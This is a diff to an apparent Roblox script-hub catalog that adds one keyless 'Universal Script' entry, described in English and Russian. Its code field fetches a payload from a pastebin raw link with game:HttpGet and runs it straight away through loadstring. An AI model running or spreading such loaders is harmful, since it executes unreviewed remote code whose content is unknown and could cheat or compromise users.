@@ -139,6 +139,16 @@
       "key_difficulty": "none",
       "script_side": "both",
       "date": "2026-04-18"
+    },
+    "script_1776544758": {
+      "name": "Universal Script",
+      "description": "\uD83C\uDDFA\uD83C\uDDF8 : Simple universal script\n\uD83C\uDDF7\uD83C\uDDFA : \u041F\u0440\u043E\u0441\u0442\u043E\u0439 \u0443\u043D\u0438\u0432\u0435\u0440\u0441\u0430\u043B\u044C\u043D\u044B\u0439 \u0441\u043A\u0440\u0438\u043F\u0442",
+      "code": "loadstring(game:HttpGet(\u0022https://pastebin.com/raw/9CrGV1w4\u0022))()",
+      "game": "Universal",
+      "keyless": true,
+      "key_difficulty": "none",
+      "script_side": "both",
+      "date": "2026-04-18"
     }
   }
 }
